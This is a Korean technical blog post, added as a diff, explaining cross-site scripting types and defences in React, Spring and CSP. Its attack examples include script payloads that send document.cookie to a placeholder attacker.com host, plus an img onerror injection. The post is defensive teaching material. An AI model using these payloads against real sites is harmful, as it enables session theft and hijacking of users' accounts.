@@ -1,0 +1,215 @@
+---
+title: XSS(Cross-Site Scripting) — 원리부터 방어까지
+date: '2026-04-04'
+category: Frontend
+tags:
+  - XSS
+  - 보안
+  - OWASP
+  - React
+  - CSP
+summary: >-
+  XSS는 공격자가 악성 스크립트를 웹 페이지에 삽입해 다른 사용자의 브라우저에서 실행시키는 공격이다. 세 가지 유형과 동작 원리, React 환경에서의 방어 방법까지 정리한다.
+thumbnail: /thumbnails/xss.svg
+---
+
+XSS(Cross-Site Scripting)는 SQL Injection과 함께 OWASP Top 10의 단골 손님이다. 공격자가 웹 페이지에 악성 JavaScript를 심어두면, 이를 열람한 다른 사용자의 브라우저에서 해당 스크립트가 실행된다. 피해자는 자신도 모르는 사이에 쿠키를 탈취당하거나, 피싱 페이지로 이동하거나, 의도치 않은 요청을 보내게 된다.
+
+## 공격 원리
+
+브라우저는 HTML을 파싱하면서 `<script>` 태그나 이벤트 핸들러를 만나면 JavaScript를 실행한다. XSS는 이 동작을 악용해 **신뢰할 수 없는 데이터를 HTML에 그대로 삽입**함으로써 공격자의 스크립트가 실행되게 만든다.
+
+```
+정상 흐름: 서버 → 안전한 HTML → 브라우저
+XSS 흐름: 공격자 입력 → HTML에 삽입 → 브라우저가 스크립트 실행
+```
+
+---
+
+## XSS 유형 세 가지
+
+### 1. Stored XSS (저장형)
+
+악성 스크립트가 **서버 DB에 저장**되어, 해당 페이지를 열람하는 모든 사용자에게 실행된다. 피해 범위가 가장 넓다.
+
+```
+공격자: 게시판에 댓글 작성
+  └─ 내용: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
+
+피해자: 게시판 페이지 열람
+  └─ 브라우저가 스크립트 실행 → 쿠키가 공격자 서버로 전송
+```
+
+### 2. Reflected XSS (반사형)
+
+악성 스크립트가 **URL 파라미터 등을 통해 서버로 전달되고, 서버가 그대로 응답에 포함**해 돌려보낸다. DB에 저장되지 않아 피해자가 직접 악성 링크를 클릭해야 한다.
+
+```
+공격자가 준비한 URL:
+https://example.com/search?q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>
+
+서버 응답 HTML:
+<p>검색 결과: <script>fetch('https://attacker.com/?c='+document.cookie)</script></p>
+
+피해자가 이 URL을 클릭하면 → 쿠키 탈취
+```
+
+### 3. DOM-based XSS
+
+서버를 거치지 않고 **클라이언트 JavaScript가 DOM을 조작하는 과정에서** 발생한다. 서버 로그에 흔적이 남지 않아 탐지가 어렵다.
+
+```javascript
+// 취약한 클라이언트 코드
+const query = new URLSearchParams(location.search).get('q')
+document.getElementById('result').innerHTML = query  // 위험!
+```
+
+```
+URL: https://example.com/search?q=<img src=x onerror=alert(1)>
+→ innerHTML에 삽입 → 브라우저가 onerror 핸들러 실행
+```
+
+---
+
+## XSS로 가능한 공격
+
+| 공격 | 설명 |
+|------|------|
+| 세션 하이재킹 | `document.cookie`로 세션 토큰 탈취 |
+| 키로거 | `addEventListener('keydown', ...)`으로 입력값 수집 |
+| 피싱 | DOM 조작으로 가짜 로그인 폼 삽입 |
+| CSRF 자동화 | 피해자 권한으로 의도치 않은 요청 전송 |
+| 악성코드 배포 | `<script src="...">` 외부 스크립트 로드 |
+
+---
+
+## 방어 방법
+
+### 1. 출력 시 이스케이프 (HTML Encoding)
+
+사용자 입력을 HTML에 삽입할 때 반드시 이스케이프한다. 특수문자를 HTML 엔티티로 변환해 브라우저가 태그로 해석하지 못하게 한다.
+
+```
+<  →  &lt;
+>  →  &gt;
+"  →  &quot;
+'  →  &#x27;
+&  →  &amp;
+```
+
+```java
+// Spring에서 Thymeleaf 사용 시 자동 이스케이프
+<p th:text="${userInput}">...</p>   <!-- 안전: 자동 이스케이프 -->
+<p th:utext="${userInput}">...</p>  <!-- 위험: 이스케이프 없음, 사용 금지 -->
+```
+
+### 2. React — innerHTML 사용 금지
+
+React는 기본적으로 JSX 표현식(`{}`)에 삽입되는 값을 자동으로 이스케이프한다.
+
+```tsx
+// 안전: React가 자동 이스케이프
+const userInput = '<script>alert(1)</script>'
+return <p>{userInput}</p>
+// 렌더링 결과: <p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
+
+// 위험: dangerouslySetInnerHTML — 꼭 필요한 경우에만, 반드시 sanitize 후 사용
+return <p dangerouslySetInnerHTML={{ __html: userInput }} />
+// 렌더링 결과: <script>alert(1)</script> 실행됨
+```
+
+`dangerouslySetInnerHTML`이 필요하다면 반드시 DOMPurify 같은 라이브러리로 정제한다.
+
+```tsx
+import DOMPurify from 'dompurify'
+
+const clean = DOMPurify.sanitize(userInput)
+return <p dangerouslySetInnerHTML={{ __html: clean }} />
+```
+
+### 3. DOM 조작 시 textContent 사용
+
+```javascript
+// 위험: innerHTML
+document.getElementById('output').innerHTML = userInput
+
+// 안전: textContent (스크립트 실행 없이 텍스트로만 처리)
+document.getElementById('output').textContent = userInput
+```
+
+### 4. HttpOnly 쿠키
+
+세션 쿠키에 `HttpOnly` 속성을 설정하면 JavaScript에서 `document.cookie`로 접근할 수 없다. XSS 공격이 성공해도 세션 토큰 탈취를 막을 수 있다.
+
+```java
+// Spring Security — 세션 쿠키 HttpOnly 설정 (기본값: true)
+@Configuration
+public class SecurityConfig {
+    @Bean
+    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+        http.sessionManagement(session -> session
+            .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
+        );
+        return http.build();
+    }
+}
+
+// 직접 쿠키 생성 시
+ResponseCookie cookie = ResponseCookie.from("SESSION", token)
+    .httpOnly(true)   // JavaScript 접근 차단
+    .secure(true)     // HTTPS에서만 전송
+    .sameSite("Strict")
+    .build();
+```
+
+### 5. Content Security Policy (CSP)
+
+HTTP 응답 헤더로 **허용된 스크립트 출처를 브라우저에 선언**한다. 인라인 스크립트 실행과 외부 악성 도메인 로드를 차단한다.
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'
+```
+
+```java
+// Spring Security에서 CSP 설정
+http.headers(headers -> headers
+    .contentSecurityPolicy(csp -> csp
+        .policyDirectives("default-src 'self'; script-src 'self'; img-src 'self' data:; object-src 'none'")
+    )
+);
+```
+
+CSP가 적용되면 공격자가 XSS로 `<script>` 태그를 삽입해도 브라우저가 실행을 거부한다.
+
+### 6. 입력 검증
+
+출력 이스케이프가 주 방어선이지만, 입력 단계에서 형식 검증을 추가하면 방어층이 두터워진다.
+
+```java
+// Spring Validation
+public class CommentRequest {
+    @NotBlank
+    @Size(max = 1000)
+    private String content;
+
+    @Pattern(regexp = "^[a-zA-Z0-9가-힣\\s.,!?]+$")  // 특수문자 제한
+    private String title;
+}
+```
+
+---
+
+## 방어 체크리스트
+
+| 항목 | 확인 |
+|------|------|
+| 사용자 입력을 HTML에 삽입할 때 이스케이프 | ✅ |
+| React `dangerouslySetInnerHTML` 사용 최소화 + DOMPurify 적용 | ✅ |
+| `innerHTML` 대신 `textContent` 사용 | ✅ |
+| 세션 쿠키에 `HttpOnly`, `Secure`, `SameSite` 설정 | ✅ |
+| CSP 헤더 적용 | ✅ |
+| URL 파라미터를 DOM에 직접 삽입하지 않음 | ✅ |
+
+---
+
+XSS 방어의 핵심은 **신뢰할 수 없는 데이터는 항상 이스케이프 후 출력하는 것**이다. React나 Thymeleaf처럼 기본적으로 이스케이프를 해주는 프레임워크를 사용하더라도, 원시 HTML 삽입 기능(`dangerouslySetInnerHTML`, `th:utext`)을 사용할 때는 반드시 사전 정제가 필요하다.
